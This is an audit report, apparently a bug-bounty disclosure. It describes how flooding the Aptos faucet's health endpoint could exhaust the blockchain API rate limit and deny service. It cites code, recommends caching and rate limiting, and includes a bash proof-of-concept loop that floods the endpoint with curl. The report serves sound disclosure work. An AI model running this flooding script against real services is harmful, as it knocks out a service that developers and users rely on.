# Audit Report

## Title
Health Check Endpoint DoS via Blockchain API Rate Limit Exhaustion

## Summary
The faucet's health check endpoint at `/` makes uncached RPC calls to the blockchain API for every request. An attacker can flood this public endpoint to exhaust the blockchain API's rate limit (100 requests/minute), causing all subsequent health checks and funding operations to fail, rendering the faucet service unavailable.

## Finding Description

The faucet exposes a public health check endpoint that is consumed by load balancers and monitoring systems. This endpoint calls `is_healthy()` on the configured Funder implementation, which makes direct RPC calls to the blockchain API without any caching or rate limiting protection. [1](#0-0) 

Both MintFunder and TransferFunder implementations make blockchain RPC calls in their `is_healthy()` methods:

**MintFunder** makes an RPC call to check if the funder account exists: [2](#0-1) 

**TransferFunder** makes an RPC call to check the account balance: [3](#0-2) 

The Aptos Node API enforces a default rate limit of 100 requests per minute: [4](#0-3) 

**Attack Scenario:**
1. Attacker sends >100 GET requests per minute to the faucet's `/` health endpoint
2. Each request triggers an RPC call to the blockchain API (either `get_account_bcs` or `view_apt_account_balance`)
3. After 100 requests, the blockchain API rate limiter blocks further requests from the faucet's IP/API key
4. Subsequent health checks fail with API errors, causing the health endpoint to return 503 SERVICE_UNAVAILABLE
5. Load balancers detect the unhealthy state and deregister the faucet instance
6. Legitimate funding requests fail because the faucet cannot make RPC calls to check balances or submit transactions

The health check endpoint has no rate limiting protection of its own, and the `is_healthy()` implementation has no caching mechanism to reduce API calls.

## Impact Explanation

This vulnerability enables attackers to render the faucet service unavailable through a simple flooding attack on the health check endpoint. This qualifies as **High severity** per the bug bounty criteria ("API crashes" - the API becomes unavailable returning 503 errors).

The impact includes:
- **Service Unavailability**: The faucet cannot process legitimate funding requests
- **Cascading Failures**: Once rate-limited, even normal operations (fund requests) fail because they also require RPC calls
- **Monitoring Blindness**: Health checks become unreliable, preventing proper operational visibility
- **Recovery Difficulty**: The rate limit persists for the duration of the rate limit window (1 minute), during which the service remains degraded

While this doesn't affect blockchain consensus or validator operations directly, it disrupts a critical developer and user-facing service.

## Likelihood Explanation

**Likelihood: High**

This attack is trivial to execute:
- No authentication required for the health endpoint
- No CAPTCHA or anti-bot measures
- Simple HTTP GET requests are sufficient
- Attacker needs minimal resources (<100 req/min from a single machine)
- Attack can be sustained indefinitely

The only barrier is the concurrent requests semaphore check, but this doesn't prevent rapid sequential requests: [5](#0-4) 

This semaphore only limits concurrent in-flight requests, not request rate.

## Recommendation

Implement a multi-layered defense:

**1. Add caching to `is_healthy()` implementations:**
```rust
// In MintFunder/TransferFunder structs, add:
last_health_check: Arc<RwLock<Option<(Instant, FunderHealthMessage)>>>,
health_check_cache_duration: Duration,

// In is_healthy() method:
async fn is_healthy(&self) -> FunderHealthMessage {
    // Check cache first
    if let Some((timestamp, cached_result)) = *self.last_health_check.read().await {
        if timestamp.elapsed() < self.health_check_cache_duration {
            return cached_result;
        }
    }
    
    // Make RPC call and update cache
    let result = self.perform_health_check().await;
    *self.last_health_check.write().await = Some((Instant::now(), result.clone()));
    result
}
```

**2. Add rate limiting specifically for the health endpoint:**
Apply the existing rate limit middleware to the health check endpoint, or implement a simple per-IP rate limiter.

**3. Consider separating liveness vs readiness checks:**
- Liveness: lightweight check that doesn't make external calls
- Readiness: full health check with RPC calls, called less frequently

**4. Implement exponential backoff on health check failures:**
If health checks start failing due to rate limits, back off to reduce API call frequency.

## Proof of Concept

```bash
#!/bin/bash
# Simple PoC demonstrating health check flooding

FAUCET_URL="http://faucet-instance:8081"
REQUESTS_PER_SECOND=2  # 120 req/min > rate limit

echo "Starting health check flood attack..."
echo "Target: $FAUCET_URL/"

for i in {1..200}; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "$FAUCET_URL/")
    echo "Request $i: HTTP $response"
    
    if [ "$response" == "503" ]; then
        echo "SUCCESS: Faucet is now unhealthy (503 returned)"
        echo "Attempting a fund request to verify service disruption..."
        fund_response=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
            -X POST "$FAUCET_URL/fund" \
            -H "Content-Type: application/json" \
            -d '{"address":"0x1","amount":1000}')
        echo "$fund_response"
        exit 0
    fi
    
    sleep 0.5
done

echo "Attack completed. Check if faucet health degraded."
```

**Expected Result:**
After ~100 requests, the health endpoint returns 503, and subsequent funding requests also fail with funder health errors.

## Notes

This vulnerability demonstrates a common anti-pattern where health check endpoints perform expensive operations without proper protection. While the faucet implements rate limiting for funding endpoints via the Checker system, the health endpoint was overlooked. The concurrent requests semaphore provides protection against resource exhaustion from parallel requests but doesn't prevent sequential request flooding that exhausts external API quotas.

### Citations

**File:** crates/aptos-faucet/core/src/endpoints/basic.rs (L46-72)
```rust
    async fn root(&self) -> poem::Result<PlainText<String>> {
        // Confirm that we haven't hit the max concurrent requests.
        if let Some(ref semaphore) = self.concurrent_requests_semaphore {
            if semaphore.available_permits() == 0 {
                return Err(poem::Error::from((
                    StatusCode::SERVICE_UNAVAILABLE,
                    anyhow::anyhow!("Server is overloaded"),
                )));
            }
        }

        // Confirm that the Funder is healthy.
        let funder_health = self.funder.is_healthy().await;
        if !funder_health.can_process_requests {
            return Err(poem::Error::from((
                StatusCode::SERVICE_UNAVAILABLE,
                anyhow::anyhow!(
                    "{}",
                    funder_health
                        .message
                        .unwrap_or_else(|| "Funder is unhealthy".to_string())
                ),
            )));
        }

        Ok(PlainText("tap:ok".to_string()))
    }
```

**File:** crates/aptos-faucet/core/src/funder/mint.rs (L553-580)
```rust
    async fn is_healthy(&self) -> FunderHealthMessage {
        let account_address = match self.get_asset_account(&self.default_asset) {
            Ok(account) => account.read().await.address(),
            Err(e) => {
                return FunderHealthMessage {
                    can_process_requests: false,
                    message: Some(format!(
                        "Default asset '{}' not found: {}",
                        self.default_asset, e
                    )),
                };
            },
        };
        let client = self.get_api_client();
        match client.get_account_bcs(account_address).await {
            Ok(_) => FunderHealthMessage {
                can_process_requests: true,
                message: None,
            },
            Err(e) => return FunderHealthMessage {
                can_process_requests: false,
                message: Some(format!(
                    "Failed to read account information for {}, it may not exist or the fullnode might not be fully synced: {:#}",
                    account_address, e
                )),
            },
        }
    }
```

**File:** crates/aptos-faucet/core/src/funder/transfer.rs (L347-380)
```rust
    async fn is_healthy(&self) -> FunderHealthMessage {
        let account_address = self.faucet_account.read().await.address();
        let funder_balance = match self
            .get_api_client()
            .view_apt_account_balance(account_address)
            .await
        {
            Ok(response) => response.into_inner(),
            Err(e) => return FunderHealthMessage {
                can_process_requests: false,
                message: Some(format!(
                    "Failed to get account balance to determine whether tap account has sufficient funds: {:#}",
                    e
                )),
            },
        };

        TRANSFER_FUNDER_ACCOUNT_BALANCE.set(funder_balance as i64);

        if funder_balance < self.minimum_funds.0 {
            FunderHealthMessage {
                can_process_requests: false,
                message: Some(format!(
                    "Funder account {} has insufficient funds. It has {}, but the minimum is {}",
                    account_address, funder_balance, self.minimum_funds.0
                )),
            }
        } else {
            FunderHealthMessage {
                can_process_requests: true,
                message: None,
            }
        }
    }
```

**File:** api/doc/README.md (L26-29)
```markdown
## Limitations
- Rate limiting: 100 requests per minute by default
- Maximum request size: 2MB
- Connection timeout: 30 seconds
```
